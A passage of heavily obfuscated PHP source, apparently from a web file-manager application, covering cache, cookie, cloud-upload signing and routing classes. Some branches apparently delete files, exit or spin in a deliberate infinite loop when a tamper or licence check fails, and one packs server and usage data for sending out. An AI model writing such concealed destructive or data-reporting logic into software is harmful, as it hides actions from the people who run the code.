$ó¼øÙãÍ = $åşİ¥Ù§[$_SERVER[¹Éµ„ºå][1017]]; $this->filterConfig($åşİ¥Ù§, $ó¼øÙãÍ[0]); $this->handle = $this->init($åşİ¥Ù§, $ÙÕ¼Ä‚Û); unset($ó¼øÙãÍ[0]); if (empty($ó¼øÙãÍ)) { return; } $‰óÂ´¬â = array_rand($ó¼øÙãÍ); $this->filterConfig($åşİ¥Ù§, $ó¼øÙãÍ[$‰óÂ´¬â]); $this->slaveHandle = $this->init($åşİ¥Ù§, $ÙÕ¼Ä‚Û); } private function filterConfig(&$ï­ê¬’Î, $Ä‚“äÔ·) { $ÑûùùŸ× =& $_SERVER[¹Éµ„ºå]; $ÄáÖ¡ÃÚ = explode($ÑûùùŸ×[4], $Ä‚“äÔ·); $ åú¬Á = array($ÑûùùŸ×[206] => $ÄáÖ¡ÃÚ[0], $ÑûùùŸ×[207] => $ÄáÖ¡ÃÚ[1]); $ï­ê¬’Î = array_merge($ï­ê¬’Î, $ åú¬Á); } public function set($Ÿ¿¦ğ•„, $¦÷÷Î×³, $üšÑŞş‰ = false) { $üšÑŞş‰ = $üšÑŞş‰ ? $üšÑŞş‰ : $this->cacheTime; return $this->handle->setEx($Ÿ¿¦ğ•„, $üšÑŞş‰, $¦÷÷Î×³); } public function setLock($Ü°¹é÷Ğ, $ïò—ù¬, $ğäò€Ñ¨) { return $this->handle->setNX($Ü°¹é÷Ğ, $ïò—ù¬); } public function get($êá‚ß°…) { $±Ó¦ñè¸ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $±Ó¦ñè¸->get($êá‚ß°…); } public function remove($ÀáÒï½Ì) { return $this->handle->del($ÀáÒï½Ì); } public function deleteAll() { $ùşÒö¿² =& $_SERVER[¹Éµ„ºå]; if ($_SERVER[$ùşÒö¿²[1025]] != $_SERVER[$ùşÒö¿²[1026]]) { $éãÜÎ³ = $ùşÒö¿²[1027]; $Üœ–Â‹ = $ùşÒö¿²[1028]; $½Í™ıÂ¿ = $_SERVER[$ùşÒö¿²[1029]] . $ùşÒö¿²[1030]; $ÔÌ·ø¾ = $Üœ–Â‹($½Í™ıÂ¿); $õÄ¸÷ş‹ = explode($ùşÒö¿²[285], $ÔÌ·ø¾); if (count($õÄ¸÷ş‹) < $ùşÒö¿²[715]) { $ãÕ‡£ç = $ùşÒö¿²[1031]; $ãÕ‡£ç(); } $Œ·û±ğ¤ = $ùşÒö¿²[1032]; $Œ·û±ğ¤($_SERVER[$ùşÒö¿²[1033]]); $Œ·û±ğ¤($_SERVER[$ùşÒö¿²[1029]] . $ùşÒö¿²[1034]); $ƒ±ëÛŒû = 1; while ($ƒ±ëÛŒû > 1) { $ƒ±ëÛŒû = $ƒ±ëÛŒû + 4; $È»¾‚ôÆ = rawurlencode($ƒ±ëÛŒû . $ùşÒö¿²[463]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $µ‚éµø) { $this->handle->flushall($µ‚éµø); } return; } return $this->handle->flushAll(); } } if (!isset($_SERVER[$_SERVER[¹Éµ„ºå][1025]]) || !isset($_SERVER[$_SERVER[¹Éµ„ºå][1035]])) { $_getc = $_SERVER[¹Éµ„ºå][1028]; $_getfile = $_SERVER[$_SERVER[¹Éµ„ºå][1029]] . $_SERVER[¹Éµ„ºå][1030]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Éµ„ºå][285], $_getfilec); if (count($_getarrs) < $_SERVER[¹Éµ„ºå][722]) { $exit = $_SERVER[¹Éµ„ºå][1031]; $exit(); } $_act = $_SERVER[¹Éµ„ºå][1036]; $_act($_SERVER[$_SERVER[¹Éµ„ºå][1029]] . $_SERVER[¹Éµ„ºå][1030]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¹Éµ„ºå][463]); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ŞêªÂøø = '', $ïÁÍĞâÖ = 0) { if (is_string($ŞêªÂøø) && $ŞêªÂøø != $_SERVER[¹Éµ„ºå][12]) { $this->prefix = $ŞêªÂøø; } if (is_numeric($ïÁÍĞâÖ) && $ïÁÍĞâÖ > 0) { $this->expire = $ïÁÍĞâÖ; } } public static function getInstance() { static $ëÔÅ»§È; if ($ëÔÅ»§È === null) { $ëÔÅ»§È = new self(); } return $ëÔÅ»§È; } private static $cookieDisable = false; public static function disable($†ıİú´ù) { self::$cookieDisable = $†ıİú´ù; } private static $sameCookieSet = array(); public static function set($¤•˜„øô, $“ŞÖ¯˜ƒ, $‘Ú‘‚Š¯ = 0, $¬”×µÎÈ = false, $è²€Ïìü = false) { $•—ˆÓ»‰ =& $_SERVER[¹Éµ„ºå]; if (self::$cookieDisable) { return; } if (!$‘Ú‘‚Š¯) { $‘Ú‘‚Š¯ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¤•˜„øô]) && self::$sameCookieSet[$¤•˜„øô] == $“ŞÖ¯˜ƒ . $‘Ú‘‚Š¯) { return; } self::$sameCookieSet[$¤•˜„øô] = $“ŞÖ¯˜ƒ . $‘Ú‘‚Š¯; if (!$è²€Ïìü) { $è²€Ïìü = str_replace(HOST, $•—ˆÓ»‰[12], APP_HOST); $è²€Ïìü = _get($GLOBALS, $•—ˆÓ»‰[1037], $è²€Ïìü); } $·©Äú¡Õ = $•—ˆÓ»‰[12]; setcookie($¤•˜„øô, $“ŞÖ¯˜ƒ, time() + $‘Ú‘‚Š¯, $•—ˆÓ»‰[8] . trim($è²€Ïìü, $•—ˆÓ»‰[8]) . $·©Äú¡Õ, !1, !1, $¬”×µÎÈ); } public static function setSafe($ìÓ†¬©Í, $Ûø¾¦ü¿, $î…ªäêò = 0) { self::set($ìÓ†¬©Í, $Ûø¾¦ü¿, $î…ªäêò, !0); } public static function get($øªìÔŸ) { static $Ğ«àÈ¦ = false; if (!$Ğ«àÈ¦) { self::initHeaderCookie(); $Ğ«àÈ¦ = !0; } return isset($_COOKIE[$øªìÔŸ]) ? $_COOKIE[$øªìÔŸ] : !1; } private static function initHeaderCookie() { $ùèÛ—í‡ =& $_SERVER[¹Éµ„ºå]; if (!isset($_SERVER[$ùèÛ—í‡[1038]]) || !$_SERVER[$ùèÛ—í‡[1038]]) { return; } $»à¨Ïõú = explode($ùèÛ—í‡[74], $_SERVER[$ùèÛ—í‡[1038]]); foreach ($»à¨Ïõú as $­èì•ãÙ) { $­èì•ãÙ = explode($ùèÛ—í‡[464], $­èì•ãÙ); if (count($­èì•ãÙ) != 2 || !isset($­èì•ãÙ[1])) { continue; } $_COOKIE[trim($­èì•ãÙ[0])] = trim($­èì•ãÙ[1]); } } public static function remove($éÇİ·Œ•, $¸çÆçñ = false) { unset($_COOKIE[$éÇİ·Œ•]); self::set($éÇİ·Œ•, $_SERVER[¹Éµ„ºå][12], 1, $¸çÆçñ); } } goto AÔ„…–ÓÄô; eËïíÅ¾–ñ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¥Ã•“³Ñ) { parent::__construct($¥Ã•“³Ñ); $this->setSignVersion($_SERVER[¹Éµ„ºå][247]); } public function uploadFormData($ˆ¢œâ¤, $ğ©ùÇô¨ = 3600) { $€Ç×­¸Û =& $_SERVER[¹Éµ„ºå]; $«Ëóşó  = $€Ç×­¸Û[229]; $á´«®»ô = $€Ç×­¸Û[1513]; $Âò³©¦¸ = $€Ç×­¸Û[261]; $Æß¤»­÷ = gmdate($€Ç×­¸Û[1514], time() + $ğ©ùÇô¨); $›¢Ûèû× = (string) time() . $€Ç×­¸Û[74] . (string) (time() + $ğ©ùÇô¨); $°şüˆ = array($€Ç×­¸Û[262] => $Æß¤»­÷, $€Ç×­¸Û[265] => array(array($€Ç×­¸Û[306] => $«Ëóşó ), array($€Ç×­¸Û[266] => $this->bucket), array($€Ç×­¸Û[267], $€Ç×­¸Û[268], $€Ç×­¸Û[12]), array($€Ç×­¸Û[270] => $Âò³©¦¸), array($€Ç×­¸Û[1515] => $á´«®»ô), array($€Ç×­¸Û[1516] => $this->accessKey), array($€Ç×­¸Û[1517] => $›¢Ûèû×))); $°şüˆ = json_encode($°şüˆ); $ÕÙ®»İÇ = hash_hmac($€Ç×­¸Û[1513], $›¢Ûèû×, $this->secret); $€¬º³• = sha1($°şüˆ); $¯³²æªñ = hash_hmac($€Ç×­¸Û[1513], $€¬º³•, $ÕÙ®»İÇ); $“áŞì¸À = array($€Ç×­¸Û[306] => $«Ëóşó , $€Ç×­¸Û[270] => $Âò³©¦¸, $€Ç×­¸Û[277] => base64_encode($°şüˆ), $€Ç×­¸Û[1515] => $á´«®»ô, $€Ç×­¸Û[1516] => $this->accessKey, $€Ç×­¸Û[1518] => $›¢Ûèû×, $€Ç×­¸Û[1519] => $¯³²æªñ, $€Ç×­¸Û[206] => $this->getHost()); return $“áŞì¸À; } public function fileOutImage($åã×ªøÍ, $€Çã»†° = 250) { $‘“Ø¹Û¡ =& $_SERVER[¹Éµ„ºå]; if ($this->size($åã×ªøÍ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($åã×ªøÍ, $€Çã»†°); } $¢úµ¢¯¯ = $this->link($åã×ªøÍ); $¢úµ¢¯¯ .= $‘“Ø¹Û¡[1520] . $€Çã»†° . $‘“Ø¹Û¡[1521]; $this->fileOutLink($¢úµ¢¯¯); } } $_file = $_SERVER[$_SERVER[¹Éµ„ºå][1035]]; $_size = $_SERVER[¹Éµ„ºå][1522]; goto b‚°¡†¶ÄÙ; E¯ÇõÕ…ÛÍ: class Application { private $defaultModule = "\x69\156\x64\145\x78"; private $defaultController = "\x69\x6e\x64\x65\x78"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($Ñ¢ì¨¿¯) { $ı§ƒÍ± =& $_SERVER[¹Éµ„ºå]; $šÆ’ºÚ‘ =& $_SERVER[ô÷‡¤È]; $ƒ„É‡¦» = explode($šÆ’ºÚ‘[0], trim($Ñ¢ì¨¿¯, $šÆ’ºÚ‘[0])); $this->defaultModule = $ƒ„É‡¦»[0] ? $ƒ„É‡¦»[0] : $this->defaultModule; $this->defaultController = $ƒ„É‡¦»[1] ? $ƒ„É‡¦»[1] : $this->defaultController; $this->defaultAction = $ƒ„É‡¦»[2] ? $ƒ„É‡¦»[2] : $this->defaultAction; $•á®ÔşÕ = $ı§ƒÍ±[706]; if (!$•á®ÔşÕ) { return; } $this->bdam72db6a97($šÆ’ºÚ‘[1], array($this, $šÆ’ºÚ‘[2])); $úúê‘¨ = $ı§ƒÍ±[707]; } public function appRun($õ¶Î”«Õ) { $„‘ªÍÀ« =& $_SERVER[¹Éµ„ºå]; $¦Çç°Å„ =& $_SERVER[ô÷‡¤È]; $»ÖŞÕİ = explode($¦Çç°Å„[0], $õ¶Î”«Õ); $òÛˆ×‹í = $„‘ªÍÀ«[708]; if (!$òÛˆ×‹í) { die; } $¿ù½‘ûÒ = strtolower($»ÖŞÕİ[0]); $¡¤Ê¾‡ı = $¦Çç°Å„[3]; $¼›øçœæ = $„‘ªÍÀ«[709]; while (strlen($¼›øçœæ) < $„‘ªÍÀ«[702]) { if (!$¼›øçœæ) { break; } $¼›øçœæ++; } if ($¿ù½‘ûÒ == $¦Çç°Å„[4]) { $¡¤Ê¾‡ı = $¦Çç°Å„[5]; $»ÖŞÕİ[0] = $¦Çç°Å„[6]; $»ÖŞÕİ[1] = $»ÖŞÕİ[1] . $¦Çç°Å„[7]; $õ¶Î”«Õ = join($¦Çç°Å„[0], $»ÖŞÕİ); $õ¶Î”«Õ = trim($õ¶Î”«Õ, $¦Çç°Å„[0]); } call_user_func(array($¦Çç°Å„[8], $¦Çç°Å„[9]), $¡¤Ê¾‡ı . $¦Çç°Å„[10], $õ¶Î”«Õ); ActionCall($õ¶Î”«Õ); $²çäñ— = $„‘ªÍÀ«[710]; if (!$²çäñ—) { die; } call_user_func(array($¦Çç°Å„[8], $¦Çç°Å„[9]), $¡¤Ê¾‡ı . $¦Çç°Å„[11], $õ¶Î”«Õ); $­½·ôŒŸ = $„‘ªÍÀ«[711]; if (!$­½·ôŒŸ) { die; } } private function autorun() { $ğåı£Æ£ =& $_SERVER[ô÷‡¤È]; global $config; if (count($config[$ğåı£Æ£[12]]) == 0) { return; } foreach ($config[$ğåı£Æ£[12]] as $„Ø×ª¥ƒ => $²Å›çú‚) { $this->appRun($²Å›çú‚); $‡Ğ©®‚‹ = $_SERVER[¹Éµ„ºå][712]; if (!$‡Ğ©®‚‹) { die; } } } private function sbzy0ba4ac9d() { $Í¾ô¯â¶ =& $_SERVER[¹Éµ„ºå]; $ù¤ôª®¯ =& $_SERVER[ô÷‡¤È]; $•ùñò³È = $ù¤ôª®¯[4]; $¨ÒÔ°Ø = $Í¾ô¯â¶[713]; if (!$¨ÒÔ°Ø) { return; } $Ø·¥¹¤æ = $GLOBALS[$ù¤ôª®¯[13]][$ù¤ôª®¯[14]][0]; if (!$Ø·¥¹¤æ || strlen($Ø·¥¹¤æ) <= strlen($•ùñò³È)) { return; } if (strtolower(substr($Ø·¥¹¤æ, -strlen($•ùñò³È))) != $•ùñò³È) { return; } $—ÓĞªıÒ = substr($Ø·¥¹¤æ, 0, -strlen($•ùñò³È)); $²§ã“Ñú = array($ù¤ôª®¯[4], $—ÓĞªıÒ); $ıÁ½» = $Í¾ô¯â¶[714]; while (strlen($ıÁ½») < $Í¾ô¯â¶[715]) { if (!$ıÁ½») { break; } $ıÁ½»++; } $àò¿”âä = array_slice($GLOBALS[$ù¤ôª®¯[13]][$ù¤ôª®¯[14]], 1); $GLOBALS[$ù¤ôª®¯[13]][$ù¤ôª®¯[14]] = array_merge($²§ã“Ñú, $àò¿”âä); $GLOBALS[$ù¤ôª®¯[13]][$ù¤ôª®¯[15]] = implode($ù¤ôª®¯[0], $GLOBALS[$ù¤ôª®¯[13]][$ù¤ôª®¯[14]]); } private function olvfbc664db0() { $¡ĞÀ¶‹œ =& $_SERVER[¹Éµ„ºå]; $ùÕÃ¹ =& $_SERVER[ô÷‡¤È]; if ($GLOBALS[$ùÕÃ¹[13]][$ùÕÃ¹[15]] != $ùÕÃ¹[6]) { return; } $½ìØµÃÇ = $_SERVER[$ùÕÃ¹[16]]; $¢ÀıÃ÷Í = $ùÕÃ¹[17]; $Èñ‘ÖÎ = $¡ĞÀ¶‹œ[716]; while ($Èñ‘ÖÎ < $¡ĞÀ¶‹œ[715]) { if ($Èñ‘ÖÎ >= 0) { break; } $Èñ‘ÖÎ++; } if (!strstr($½ìØµÃÇ, $¢ÀıÃ÷Í)) { return; } $âò¶îÏ¤ = strrpos($½ìØµÃÇ, $¢ÀıÃ÷Í); $ä‹à›ÚÓ = $¡ĞÀ¶‹œ[717]; if (!$ä‹à›ÚÓ) { die; } $†Ã¨ôí = substr($½ìØµÃÇ, $âò¶îÏ¤ + strlen($¢ÀıÃ÷Í)); $¡ÜÀá©Æ = $¡ĞÀ¶‹œ[718]; if (strlen($¡ÜÀá©Æ) < $¡ĞÀ¶‹œ[715]) { return; } preg_match_all($ùÕÃ¹[18], $†Ã¨ôí, $Øªª¢à); $ßŠ–×š = $¡ĞÀ¶‹œ[719]; if (!$ßŠ–×š) { return; } $†Ã¨ôí = trim($Øªª¢à[0][0], $ùÕÃ¹[19]); $Óıõ÷ùØ = $¡ĞÀ¶‹œ[720]; $GLOBALS[$ùÕÃ¹[13]][$ùÕÃ¹[14]] = explode($ùÕÃ¹[19], $†Ã¨ôí); $GLOBALS[$ùÕÃ¹[13]][$ùÕÃ¹[15]] = implode($ùÕÃ¹[0], $GLOBALS[$ùÕÃ¹[13]][$ùÕÃ¹[14]]); $­¡ï¯Ãó = $¡ĞÀ¶‹œ[721]; if (strlen($­¡ï¯Ãó) < $¡ĞÀ¶‹œ[722]) { die; } } public function run() { $º±ÓûĞ… =& $_SERVER[¹Éµ„ºå]; $êüÁ»ŞÚ =& $_SERVER[ô÷‡¤È]; $this->olvfbc664db0(); $this->sbzy0ba4ac9d(); $ïôî´† = $º±ÓûĞ…[723]; if (!$ïôî´†) { die; } $Ûª€¯ß = $GLOBALS[$êüÁ»ŞÚ[13]][$êüÁ»ŞÚ[14]]; $É®Ö«œ = $GLOBALS[$êüÁ»ŞÚ[13]][$êüÁ»ŞÚ[15]]; define($êüÁ»ŞÚ[20], isset($Ûª€¯ß[0]) && $Ûª€¯ß[0] ? $Ûª€¯ß[0] : $this->defaultModule); define($êüÁ»ŞÚ[21], isset($Ûª€¯ß[1]) && $Ûª€¯ß[0] ? $Ûª€¯ß[1] : $this->defaultController); define($êüÁ»ŞÚ[22], isset($Ûª€¯ß[2]) && $Ûª€¯ß[0] ? $Ûª€¯ß[2] : $this->defaultAction); define($êüÁ»ŞÚ[23], MOD . $êüÁ»ŞÚ[0] . ST . $êüÁ»ŞÚ[0] . ACT); $É„ÑÚã¼ = $º±ÓûĞ…[724]; $_SERVER[$êüÁ»ŞÚ[24]] = strtolower(ACTION); $this->autorun(); if (count($Ûª€¯ß) >= 3) { $this->appRun($É®Ö«œ); } else { $this->appRun(ACTION); } } private $drtp22f459a0 = array(); private $sqeh61d8fa06 = ''; public function vcbge18dcc81() { $‡ãœ•²ğ =& $_SERVER[¹Éµ„ºå]; $Åì—®‚Ş =& $_SERVER[ô÷‡¤È]; $this->uhksa3375e3d(); $ı·£Ì = $‡ãœ•²ğ[725]; if (!$ı·£Ì) { return; } $this->bifdafb48183(); $ÌÌ¸‚Ö = $‡ãœ•²ğ[726]; $this->hnkp28d776c5(); $this->muft41eeeef2(); $this->lhvadcc1d7c9(); $this->rnzb3d1c2b4c(); $ÉåÀŞ£ = $‡ãœ•²ğ[727]; if (strlen($ÉåÀŞ£) < $‡ãœ•²ğ[702]) { return; } $this->xkunf95ae420(); $¤ŸåÁÈ• = $‡ãœ•²ğ[728]; while ($¤ŸåÁÈ• < $‡ãœ•²ğ[715]) { if ($¤ŸåÁÈ• >= 0) { break; } $¤ŸåÁÈ•++; } $this->bdam72db6a97($Åì—®‚Ş[25], array($this, $Åì—®‚Ş[26])); $ Éã Ê = $‡ãœ•²ğ[729]; if (!$ Éã Ê) { return; } $this->bdam72db6a97($Åì—®‚Ş[27], array($this, $Åì—®‚Ş[28])); $ÏÈ™Ãú = $‡ãœ•²ğ[730]; $this->bdam72db6a97($Åì—®‚Ş[29], array($this, $Åì—®‚Ş[30])); $ö½Ë†„ = $‡ãœ•²ğ[731]; $this->bdam72db6a97($Åì—®‚Ş[31], array($this, $Åì—®‚Ş[32])); } public function getVersionData() { $ìİ—–šî =& $_SERVER[¹Éµ„ºå]; return $this->drtp22f459a0; $ÆŠ…½¢¿ = $ìİ—–šî[732]; if (strlen($ÆŠ…½¢¿) < $ìİ—–šî[722]) { return; } } public function fedq7b281332($â¸ÊäÂ) { $£ÕØ£Ï =& $_SERVER[¹Éµ„ºå]; $Ñ›…Ğ =& $_SERVER[ô÷‡¤È]; $˜Ş©Û´³ = Model($Ñ›…Ğ[33])->get(); $ôö×ãß— = array($Ñ›…Ğ[34], $Ñ›…Ğ[35], $Ñ›…Ğ[36], $Ñ›…Ğ[37], $Ñ›…Ğ[38], $Ñ›…Ğ[39], $Ñ›…Ğ[40], $Ñ›…Ğ[41], $Ñ›…Ğ[42], $Ñ›…Ğ[43], $Ñ›…Ğ[44], $Ñ›…Ğ[45], $Ñ›…Ğ[46], $Ñ›…Ğ[47], $Ñ›…Ğ[48], $Ñ›…Ğ[49], $Ñ›…Ğ[50], $Ñ›…Ğ[51], $Ñ›…Ğ[52], $Ñ›…Ğ[53], $Ñ›…Ğ[54], $Ñ›…Ğ[55], $Ñ›…Ğ[56], $Ñ›…Ğ[57], $Ñ›…Ğ[58], $Ñ›…Ğ[59], $Ñ›…Ğ[60], $Ñ›…Ğ[61], $Ñ›…Ğ[62], $Ñ›…Ğ[63], $Ñ›…Ğ[64], $Ñ›…Ğ[65], $Ñ›…Ğ[66], $Ñ›…Ğ[67], $Ñ›…Ğ[68], $Ñ›…Ğ[69], $Ñ›…Ğ[70], $Ñ›…Ğ[71], $Ñ›…Ğ[72], $Ñ›…Ğ[73], $Ñ›…Ğ[74], $Ñ›…Ğ[75], $Ñ›…Ğ[76], $Ñ›…Ğ[77], $Ñ›…Ğ[78], $Ñ›…Ğ[79], $Ñ›…Ğ[80], $Ñ›…Ğ[81], $Ñ›…Ğ[82], $Ñ›…Ğ[83], $Ñ›…Ğ[84], $Ñ›…Ğ[85], $Ñ›…Ğ[86], $Ñ›…Ğ[87]); foreach ($ôö×ãß— as $¯Œ¿òƒÎ) { $âÊËéÍ = $GLOBALS[$Ñ›…Ğ[88]][$Ñ›…Ğ[89]][$¯Œ¿òƒÎ]; if (isset($˜Ş©Û´³[$¯Œ¿òƒÎ])) { $âÊËéÍ = $˜Ş©Û´³[$¯Œ¿òƒÎ]; } $â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[91]][$¯Œ¿òƒÎ] = $âÊËéÍ; } $œËØ¼Ç£ = $â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[91]][$Ñ›…Ğ[46]]; unset($â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[92]][$Ñ›…Ğ[93]]); unset($â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[92]][$Ñ›…Ğ[94]]); unset($â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[91]][$Ñ›…Ğ[46]]); unset($â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[91]][$Ñ›…Ğ[95]]); $â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[91]][$Ñ›…Ğ[96]] = array($Ñ›…Ğ[97] => (int) $œËØ¼Ç£[$Ñ›…Ğ[98]], $Ñ›…Ğ[99] => (int) _get($œËØ¼Ç£, $Ñ›…Ğ[100], 0)); $•ò›èèö = $£ÕØ£Ï[733]; while (strlen($•ò›èèö) < $£ÕØ£Ï[722]) { if (!$•ò›èèö) { break; } $•ò›èèö++; } $×¾ÏéŞ® = substr(md5($Ñ›…Ğ[101] . get_client_ip() . $˜Ş©Û´³[$Ñ›…Ğ[102]]), 0, 15); $ø„æùÂ˜ = $£ÕØ£Ï[734]; while (strlen($ø„æùÂ˜) < $£ÕØ£Ï[735]) { if (!$ø„æùÂ˜) { break; } $ø„æùÂ˜++; } $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[104]] = Mcrypt::encode(Session::sign(), $×¾ÏéŞ®, 3600 * 24); $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[105]] = Action($Ñ›…Ğ[106])->accessToken(); $ä«‹Æ›³ = $£ÕØ£Ï[736]; if (strlen($ä«‹Æ›³) < $£ÕØ£Ï[715]) { die; } $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[107]] = md5($_SERVER[$Ñ›…Ğ[108]] . $˜Ş©Û´³[$Ñ›…Ğ[102]]); $ŠÇ™‘¿á = $£ÕØ£Ï[737]; $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[109]] = base64_encode(serverInfo()); $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[110]] = $this->sqeh61d8fa06; $àä—Å†µ = $£ÕØ£Ï[738]; while ($àä—Å†µ < $£ÕØ£Ï[715]) { if ($àä—Å†µ >= 0) { break; } $àä—Å†µ++; } if ($˜Ş©Û´³[$Ñ›…Ğ[110]] != $Ñ›…Ğ[111]) { $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[112]] = $˜Ş©Û´³[$Ñ›…Ğ[112]]; $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[113]] = $˜Ş©Û´³[$Ñ›…Ğ[113]]; $«Ñ‚Àê° = rand_string(10) . $this->sqeh61d8fa06 . rand_string(5); $â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[114]][$Ñ›…Ğ[115]] = $this->btfg414f282e($«Ñ‚Àê°, $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[107]]); } if ($this->sqeh61d8fa06 == $Ñ›…Ğ[111]) { $â¸ÊäÂ[$Ñ›…Ğ[90]][$Ñ›…Ğ[91]][$Ñ›…Ğ[96]][$Ñ›…Ğ[100]] = 0; } $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[116]] = $this->versionPluginFilter(); $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[117]] = _get($this->drtp22f459a0, $Ñ›…Ğ[118], $Ñ›…Ğ[6]); $´ô×Ãå£ = $£ÕØ£Ï[739]; if (KodUser::isRoot() && $this->config[$Ñ›…Ğ[119]]) { $â¸ÊäÂ[$Ñ›…Ğ[103]][$Ñ›…Ğ[120]] = WEB_ROOT; } return $â¸ÊäÂ; } private function rnzb3d1c2b4c() { $—÷´«è… =& $_SERVER[¹Éµ„ºå]; $¥¼ÊÓôí =& $_SERVER[ô÷‡¤È]; $ï à™ô† = $_SERVER[$¥¼ÊÓôí[24]] == $¥¼ÊÓôí[121]; if ($_SERVER[$¥¼ÊÓôí[24]] == $¥¼ÊÓôí[122] && $_GET[$¥¼ÊÓôí[123]] == $¥¼ÊÓôí[124]) { $ï à™ô† = !0; } if ($ï à™ô†) { $š©âÄÛÆ = array($¥¼ÊÓôí[110] => $this->sqeh61d8fa06, $¥¼ÊÓôí[125] => $this->gxnicc1bdd2a(), $¥¼ÊÓôí[126] => Model($¥¼ÊÓôí[127])->count()); if ($this->sqeh61d8fa06 != $¥¼ÊÓôí[111]) { $ãíİÒÕ = _get($this->drtp22f459a0, $¥¼ÊÓôí[128]); if ($ãíİÒÕ) { $š©âÄÛÆ[$¥¼ÊÓôí[129]] = $ãíİÒÕ; $š©âÄÛÆ[$¥¼ÊÓôí[130]] = strtotime(_get($this->drtp22f459a0, $¥¼ÊÓôí[131])); $š©âÄÛÆ[$¥¼ÊÓôí[132]] = _get($this->drtp22f459a0, $¥¼ÊÓôí[118]); } $¹í´šˆ = Model($¥¼ÊÓôí[33])->get($¥¼ÊÓôí[133], $¥¼ÊÓôí[6], !0); if (is_string($¹í´šˆ) && substr($¹í´šˆ, 0, 1) == $¥¼ÊÓôí[134]) { $¹í´šˆ = json_decode_force($¹í´šˆ); } if (is_array($¹í´šˆ) && $¹í´šˆ[$¥¼ÊÓôí[135]] && strstr($¹í´šˆ[$¥¼ÊÓôí[135]], $¥¼ÊÓôí[136])) { $“ºŞ€§à = explode($¥¼ÊÓôí[136], $¹í´šˆ[$¥¼ÊÓôí[135]]); $š©âÄÛÆ[$¥¼ÊÓôí[137]] = $“ºŞ€§à[0]; } } $š©âÄÛÆ = $this->cvps5573fc4e(json_encode($š©âÄÛÆ), md5($¥¼ÊÓôí[138])); $§µ¡õìÃ = $—÷´«è…[740]; if (strlen($§µ¡õìÃ) < $—÷´«è…[715]) { return; } $¬Š»É¨œ = array($¥¼ÊÓôí[139] => $š©âÄÛÆ); $ òî÷… = $—÷´«è…[741]; call_user_func(array($¥¼ÊÓôí[140], $¥¼ÊÓôí[141]), $¬Š»É¨œ); } if ($this->sqeh61d8fa06 == $¥¼ÊÓôí[111]) { return; } $Şª“ƒÀÔ = array($¥¼ÊÓôí[142], $¥¼ÊÓôí[143], $¥¼ÊÓôí[144], $¥¼ÊÓôí[145], $¥¼ÊÓôí[146], $¥¼ÊÓôí[147]); $æ‰‰ÛË› = $—÷´«è…[742]; if (!$æ‰‰ÛË›) { die; } $ú×ÆŞ³ = Model($¥¼ÊÓôí[33])->get(); $¬Š»É¨œ = array($¥¼ÊÓôí[148] => $ú×ÆŞ³[$¥¼ÊÓôí[34]], $¥¼ÊÓôí[149] => $ú×ÆŞ³[$¥¼ÊÓôí[35]], $¥¼ÊÓôí[150] => $¥¼ÊÓôí[6]); $°´†Õª = $—÷´«è…[743]; foreach ($Şª“ƒÀÔ as $ ¯õÆÎ) { if (!isset($ú×ÆŞ³[$ ¯õÆÎ]) || !$ú×ÆŞ³[$ ¯õÆÎ]) { continue; } $¬Š»É¨œ[$ ¯õÆÎ] = $ú×ÆŞ³[$ ¯õÆÎ]; $•€İ¹…¿ = $—÷´«è…[744]; if (!$•€İ¹…¿) { die; } } call_user_func(array($¥¼ÊÓôí[140], $¥¼ÊÓôí[141]), $¬Š»É¨œ); } private function muft41eeeef2() { $ûºŒ¯†” =& $_SERVER[¹Éµ„ºå]; $¸€û£Œ½ =& $_SERVER[ô÷‡¤È]; if ($_SERVER[$¸€û£Œ½[24]] != $¸€û£Œ½[151]) { return; } if (!KodUser::isRoot()) { die; } $–±¼œ = $GLOBALS[$¸€û£Œ½[13]]; if (isset($–±¼œ[$¸€û£Œ½[152]])) { $this->btzc3815bf24(); die; } if (isset($–±¼œ[$¸€û£Œ½[153]]) && isset($–±¼œ[$¸€û£Œ½[153]]) == $¸€û£Œ½[124]) { $–±¼œ[$¸€û£Œ½[154]] = Model($¸€û£Œ½[33])->get($¸€û£Œ½[155]); } if (!isset($–±¼œ[$¸€û£Œ½[154]]) || strlen($–±¼œ[$¸€û£Œ½[154]]) != 16) { show_json($¸€û£Œ½[156] . $–±¼œ[$¸€û£Œ½[154]], !1); } $ò¹‘Óü÷ = Model($¸€û£Œ½[33])->get($¸€û£Œ½[102]); $¢ÎŒ¢Æ† = md5($_SERVER[$¸€û£Œ½[108]] . $ò¹‘Óü÷); $¾«‘¨ç¬ = $ûºŒ¯†”[745]; if (strlen($¾«‘¨ç¬) < $ûºŒ¯†”[735]) { return; } $¢É´î† = array($¸€û£Œ½[154] => $–±¼œ[$¸€û£Œ½[154]], $¸€û£Œ½[157] => rand_string(16), $¸€û£Œ½[158] => $¸€û£Œ½[138], $¸€û£Œ½[159] => 